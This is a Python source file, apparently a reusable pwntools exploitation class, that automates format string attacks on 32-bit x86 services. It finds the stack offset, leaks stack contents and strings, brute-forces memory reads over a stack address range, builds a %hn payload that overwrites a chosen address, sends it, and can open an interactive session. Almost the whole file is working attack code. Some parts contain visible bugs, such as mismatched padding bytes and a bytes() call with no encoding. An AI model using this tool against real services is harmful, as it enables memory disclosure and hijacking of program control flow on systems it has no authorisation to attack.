# x86
# Overwrite the address of the var `overwrite` with the address of `wanted`
from pwn import *
from time import sleep
from tools.pattern_tools import extract_tokens


class FormatStringExploit:
    
    ### INITIALIZATION METHODS ###
    # region

    def __init__(self, dispatcher, verbose=False):
        self.verbose = verbose
        self.dispatcher = dispatcher
        self.x86 = True

        # Variables will be set during the exploit process
        self.offset, self.stack_alignment = None, None
        self.init_instructions = None
        self.pattern = None

    def setup_init_instructions(self, init_instructions):
        """
        Set up the initial instructions to be at the beginning of the exploit.
        :param init_instructions: List of instructions to execute, this list should contain tuples of (command, argument)
                                  Commands can be "recv" or "send".
                                  Careful with the command "recv" for recv an int you should give an integer and not a string.
        :return: None
        """
        self.init_instructions = init_instructions
        if self.verbose:
            print("Initial instructions set up.")
    
    def setup_address_pattern(self, pattern):
        """
        Set up the address pattern for the exploit.
        :param pattern: The address pattern to use
        :return: None
        """
        self.pattern = pattern
        if self.verbose:
            print(f"Address pattern set to: {self.pattern}")
        
    def update_offset_and_stack_alignment(self, offset, stack_alignment):
        """
        Update the offset and stack alignment for the exploit.
        :param offset: The offset to use in the format string exploit
        :param stack_alignment: The stack alignment to use in the exploit
        :return: None
        """
        self.offset = offset
        self.stack_alignment = stack_alignment
        if self.verbose:
            print(f"Offset updated to {self.offset}, Stack alignment updated to {self.stack_alignment}")
    # endregion

    ### INITIAL INSTRUCTION METHODS ###
    # region
    def launch_init_instructions(self):
        """
        Launch the initial instructions set up before the exploit.
        :return: None
        """
        if self.init_instructions:
            self.dispatcher.parse_instructions(self.init_instructions)
            if self.verbose:
                print("Initial instructions executed.")
        else:
            raise ValueError("Initial instructions not set up. Call setup_init_instructions() first.")
    # endregion

    ### FIND OFFSET AND STACK ALIGNMENT METHODS ###
    # region
    
    def find_offset(self, max_offset=100, delay_between_request=0, connect_and_close=False, retry_on_error=True):
        """
        Find the offset for the format string exploit.        :param max_offset: Maximum offset to try
        :param connect_and_close: Whether to connect and close the dispatcher for each offset
        :param retry_on_error: Whether to retry on error
        :return: The offset and the stack alignment if found, otherwise None
        """
        for i in range(1, max_offset + 1):
            try:
                # Attempt to connect to the target service
                if connect_and_close:
                    self.dispatcher.connect()
                    if self.init_instructions:
                        self.launch_init_instructions()
                else:
                    if not self.dispatcher.is_connected() and self.dispatcher.is_interactive():
                        print("You must connect before sending commands or enable connect_and_close.")
                        return None, None

                # Craft the string bug command
                # The command is designed to trigger a format string vulnerability
                command = b"AAAA" + b"%" + bytes(str(i), 'utf-8') + b"$x"

                # Send the command and receive the response
                self.dispatcher.send_command(command)
                response = self.dispatcher.receive_response()

                if self.verbose:
                    print(f"Response for offset {i}: {response}")

                # If a pattern is set, extract the address from the response
                if self.pattern:
                    response = extract_tokens(self.pattern, response)
                    if response is not None:
                        response = response["address"]
                    else:
                        if self.verbose:
                            print(f"Pattern did not match in response: {response}")
                        if retry_on_error:
                            continue
                        else:
                            raise ValueError(f"Pattern did not match in response: {response}\n. For skipping this error, set retry_on_error=True.")
                    if self.verbose:
                        print(f"Extracted address: {response}")

                # Close the connection if specified
                if connect_and_close:
                    self.dispatcher.close()

                # Check if the response contains the address we are looking for
                if b"41414141" in response:
                    if self.verbose:
                        print(f"[+] Found offset: {i}")
                    self.offset = i
                    self.stack_alignment = 0
                    return i, 0
                # Check for non-aligned addresses
                if b"41" in response:
                    stack_alignment = self.find_none_aligned_offset(i)
                    if stack_alignment is not None:
                        if self.verbose:
                            print(f"[+] Found non-aligned offset: {i} with stack alignment: {stack_alignment}")
                        self.offset = i
                        self.stack_alignment = stack_alignment
                        return self.offset, stack_alignment
                    
            except Exception as e:
                if self.verbose:
                    print(f"Error finding offset {i}: {e}")
                if not retry_on_error:
                    break
            if delay_between_request > 0:
                sleep(delay_between_request)
        return None, None
    
    def find_none_aligned_offset(self, offset):
        """Find the offset for the format string exploit with non-aligned addresses."""
        range_offset = 4 if self.x86 else 8
        for i in range(1, range_offset):
            try:
                # Attempt to connect to the target service
                self.dispatcher.connect()
                command = b"4" * (4 + i) + b"%" + bytes(str(offset), 'utf-8') + b"$x"
                self.dispatcher.send_command(command)
                response = self.dispatcher.receive_response()

                if self.verbose:
                    print(f"Response for offset {offset + i}: {response}")

                # If a pattern is set, extract the address from the response
                if self.pattern:
                    response = extract_tokens(self.pattern, response)["address"]
                    print(f"Extracted address: {response}")

                if b"41414141" in response:
                    if self.verbose:
                        print(f"[+] Found non-aligned offset: {offset + i}")
                    return i
            except Exception as e:
                if self.verbose:
                    print(f"Error finding non-aligned offset {offset + i}: {e}")
        return None
    # endregion

    ### PAYLOAD GENERATION METHODS ###
    # region

    def split_address(self, address):
        """Split an address into high and low 16 bits."""
        high = (address >> 16) & 0xFFFF
        low = address & 0xFFFF
        if high > low:
            if self.verbose:
                print(f"High 16 bits: {high:#06x}, Low 16 bits: {low:#06x}")
            return high, low, False
        else:
            if self.verbose:
                print(f"High 16 bits: {low:#06x}, Low 16 bits: {high:#06x} (swapped)")
            return low, high, True
        
    def return_payload(self, address_overwrite, address_wanted):
        """
        Generate the payload to overwrite an address with a specific value.
        :param address_overwrite: The address to overwrite
        :param address_wanted: The address to write to
        :return: The payload to send to the target service
        """

        if self.offset is None:
            raise ValueError("Offset not set. Call find_offset() first.")
        
        if self.verbose:
            print(f"Using offset: {self.offset}, Stack alignment: {self.stack_alignment}")
        
        # Split the address into high and low 16 bits
        high_16, low_16, swapped = self.split_address(address_wanted)

        first_offset = bytes(str(low_16 - self.stack_alignment - 8), 'utf-8')
        second_offset = bytes(str(high_16 - low_16), 'utf-8')
        # Add stack alignment
        payload = b"\x90" * self.stack_alignment

        # Add the address to overwrite
        payload += p32(address_overwrite)
        # Add the second address to overwrite
        payload += p32(address_overwrite + 0x2)

        # Contruct the format string payload
        payload += b"%" + first_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(self.offset + 1), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(self.offset), 'utf-8') + b'$hn'
        payload += b"%" + second_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(self.offset), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(self.offset + 1), 'utf-8') + b'$hn'
        if self.verbose:
            print(f"Payload length: {len(payload)}")
            print(payload)
        return payload
    # endregion

    ### STACK METHODS ###
    # region

    def return_stack_addresses(self, filter_addresses=None, max_length=1000, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Return all addresses between range in filter_addresses.
        :param filter_addresses: List of tuples (address_low, address_sup) to filter addresses. If this is None, all addresses will be returned.
        :param max_length: Maximum length of the stack to search for addresses
        :return: List of tuples (offset, address) where offset is the offset in the format string and address is the address found in the stack
        """

        addresses = []
        if filter_addresses is None:
            filter_addresses = []

        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close:
                self.dispatcher.connect()
                if self.init_instructions:
                    self.launch_init_instructions()
    
            # Craft the command to send
            command = b"%" + bytes(str(i), 'utf-8') + b"$p"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print(f"Error receiving response for offset {i}: {e}")
                if not retry_on_error:
                    break
                continue

            # If a pattern is set, extract the address from the response
            if self.pattern:
                response = extract_tokens(self.pattern, response)
                if response is not None:
                    response = response["address"]
                else:
                    if self.verbose:
                        print(f"Pattern did not match in response: {response}")
                    if retry_on_error:
                        continue
                    else:
                        raise ValueError(f"Pattern did not match in response: {response}\n. For skipping this error, set retry_on_error=True.")
                if self.verbose:
                    print(f"Extracted address: {response}")

            if response == b"" or response == b"(nil)" or response == '(null)':
                # Close the connection if specified
                if connect_and_close:
                    self.dispatcher.close()
                continue  # Skip empty responses

            # Add all addresses if no filter is provided
            if len(filter_addresses) == 0:
                try:
                    addresses.append((i, hex(int(response, 16))))
                except ValueError:
                    print(f"Try to use a pattern to extract the address from the response (setup_address_pattern()): {response}")
            # Check if the response is valid
            for address_low, address_sup in filter_addresses:
                
                int_address_response = int(response, 16)
                    
                # Check if the address is within the specified range
                if address_low <= int_address_response <= address_sup:
                    if self.verbose:
                        print(f"Found address: {int_address_response:#x} for offset {i}")

                    # Check if the address is not already in the list
                    if not any(int_address_response == addr[1] for addr in addresses):
                        addresses.append((i, hex(int_address_response)))
                        if self.verbose:
                            print(f"Added address: {int_address_response:#x} for offset {i}")
                        break
            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)
            
            # Close the connection if specified
            if connect_and_close:
                self.dispatcher.close()

            if self.verbose:
                print(f"Response for offset {i}: {response}")
        if self.verbose:
            print(f"Found {len(addresses)} addresses in the stack.")
        return addresses

    def print_stack_strings(self, print_ascii=False, max_length=1000, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Print the strings found in the stack.
        :return: None
        """

        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close:
                self.dispatcher.connect()
                if self.init_instructions:
                    self.launch_init_instructions()
    
            if print_ascii:
                # Craft the command to send for printing ASCII strings
                command = b"%" + bytes(str(i), 'utf-8') + b"$s"
            else:
                # Craft the command to send for printing hexadecimal addresses
                command = b"%" + bytes(str(i), 'utf-8') + b"$p"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print(f"Error receiving response for offset {i}: {e}")
                if not retry_on_error:
                    break
                continue

            # If a pattern is set, extract the address from the response
            if self.pattern:
                response = extract_tokens(self.pattern, response)
                if response is not None:
                    response = response["address"]
                else:
                    if self.verbose:
                        print(f"Pattern did not match in response: {response}")
                    if retry_on_error:
                        continue
                    else:
                        raise ValueError(f"Pattern did not match in response: {response}\n. For skipping this error, set retry_on_error=True.")
                if self.verbose:
                    print(f"Extracted address: {response}")

            if response == b"" or response == b"(nil)" or response == b'(null)':
                # Close the connection if specified
                if connect_and_close:
                    self.dispatcher.close()
                    
                continue  # Skip empty responses

            # Print the response as a string
            try:
                response_str = response.decode('utf-8', errors='ignore')
                print(f"Offset {i}: {response_str}")
            except UnicodeDecodeError:
                print(f"Offset {i}: Non-decodable response: {response}")

            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)

            # Close the connection if specified
            if connect_and_close:
                self.dispatcher.close()

            if self.verbose:
                print(f"Response for offset {i}: {response}")


    def find_string_in_stack(self, string_to_find, max_length=1000, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Find a specific string in the stack.
        :param string_to_find: The string to find in the stack
        :param max_length: Maximum length of the stack to search for addresses
        :return: List of tuples (offset, address) where offset is the offset in the format string and address is the address found in the stack
        """
        addresses = self.return_stack_addresses(
            filter_addresses=None,
            max_length=max_length,
            delay_between_request=delay_between_request,
            connect_and_close=connect_and_close,
            retry_on_error=retry_on_error
        )
        
        found_addresses = []
        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close:
                self.dispatcher.connect()
                if self.init_instructions:
                    self.launch_init_instructions()
    
            
            # Craft the command to send for printing ASCII strings
            command = b"%" + bytes(str(i), 'utf-8') + b"$s"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print(f"Error receiving response for offset {i}: {e}")
                if not retry_on_error:
                    break
                continue

            # If a pattern is set, extract the address from the response
            if self.pattern:
                response = extract_tokens(self.pattern, response)
                if response is not None:
                    response = response["address"]
                else:
                    if self.verbose:
                        print(f"Pattern did not match in response: {response}")
                    if retry_on_error:
                        continue
                    else:
                        raise ValueError(f"Pattern did not match in response: {response}\n. For skipping this error, set retry_on_error=True.")
                if self.verbose:
                    print(f"Extracted address: {response}")

            if response == b"" or response == b"(nil)" or response == b'(null)':
                # Close the connection if specified
                if connect_and_close:
                    self.dispatcher.close()
                    
                continue  # Skip empty responses

            # Print the response as a string
            try:
                if string_to_find in response.decode('utf-8', errors='ignore'):
                    response_str = response.decode('utf-8', errors='ignore')
                    if self.verbose:
                        print(f"Offset {i}: {response_str}")
                    
                    for offset, address in addresses:
                        if offset == i:
                            found_addresses.append((address, response_str))
                else:
                    if self.verbose:
                        print(f"Offset {i}: String '{string_to_find}' not found in response: {response}")
            except UnicodeDecodeError:
                print(f"Offset {i}: Non-decodable response: {response}")

            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)

            # Close the connection if specified
            if connect_and_close:
                self.dispatcher.close()

            if self.verbose:
                print(f"Response for offset {i}: {response}")

        if self.verbose:
            print(f"Found {len(found_addresses)} addresses containing the string '{string_to_find}' in the stack.")
            
        return found_addresses

    def brute_force_find_string(self, string_to_find, starting_address=0xbfff0000, end_address=0xbfffffff, increment=0x2, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Find a specific string in a current address range.
        :param string_to_find: The string to find
        :param starting_address: The starting address to begin the search
        :return: address where the string is found or None if not found
        """
        if self.offset is None:
            raise ValueError("Offset not set. Call find_offset() first.")
        
        if self.verbose:
            print(f"Using offset: {self.offset}, Stack alignment: {self.stack_alignment}")
        
        # Main loop to find addresses
        while starting_address < end_address:
            # Attempt to connect to the target service
            if connect_and_close:
                self.dispatcher.connect()
                if self.init_instructions:
                    self.launch_init_instructions()
    
            
            # Craft the command to send for printing ASCII strings
            if self.x86:
                command = b"A" * self.stack_alignment + p32(starting_address) + b"%" + bytes(str(self.offset)) + b"$s"
            else:
                command = b"A" * self.stack_alignment + p64(starting_address) + b"%" + bytes(str(self.offset)) + b"$s"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print(f"Error receiving response for address {starting_address:#x}: {e}")
                if not retry_on_error:
                    break
                starting_address += increment
                continue

            # If a pattern is set, extract the address from the response
            if self.pattern:
                response = extract_tokens(self.pattern, response)
                if response is not None:
                    response = response["address"]
                else:
                    if self.verbose:
                        print(f"Pattern did not match in response: {response}")
                    if retry_on_error:
                        starting_address += increment
                        continue
                    else:
                        raise ValueError(f"Pattern did not match in response: {response}\n. For skipping this error, set retry_on_error=True.")
                if self.verbose:
                    print(f"Extracted address: {response}")

            if response == b"" or response == b"(nil)" or response == b'(null)':
                # Close the connection if specified
                if connect_and_close:
                    self.dispatcher.close()
                starting_address += increment
                continue  # Skip empty responses

            # Print the response as a string
            try:
                if string_to_find in response.decode('utf-8', errors='ignore'):
                    response_str = response.decode('utf-8', errors='ignore')
                    if self.verbose:
                        print(f"Found string '{string_to_find}' at address {starting_address:#x}: {response_str}")
                    return starting_address
                else:
                    if self.verbose:
                        print(f"Address {starting_address:#x}: String '{string_to_find}' not found in response: {response}")
            except UnicodeDecodeError:
                print(f"Address {starting_address:#x}: Non-decodable response: {response}")

            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)

            # Close the connection if specified
            if connect_and_close:
                self.dispatcher.close()

            starting_address += increment

        if self.verbose:
            print(f"String '{string_to_find}' not found in the address range {starting_address:#x} to {end_address:#x}.")
        return None
    
    # endregion

    ## EXPLOIT METHODS ##
    # region

    def classic_exploit(self, address_overwrite, address_wanted, interactive=False):
        """
        Perform the classic format string exploit.
        :param address_overwrite: The address to overwrite
        :param address_wanted: The address to write to
        :return: The payload to send to the target service
        """
        print('self.offset:', self.offset)
        if self.offset is None:
            raise ValueError("Offset not set. Call find_offset() first.")
        
        if self.verbose:
            print(f"Using offset: {self.offset}, Stack alignment: {self.stack_alignment}")

        # Generate the payload to overwrite the address
        payload = self.return_payload(address_overwrite, address_wanted)

        # Send the payload to the target service
        self.dispatcher.send_command(payload)

        if interactive:
            # Start an interactive session with the target service
            self.dispatcher.interactive()
            self.dispatcher.close()
        else:
            # Close the connection if not in interactive mode
            self.dispatcher.close()

        if self.verbose:
            print(f"Payload sent: {payload}")

        return payload
    
    # endregion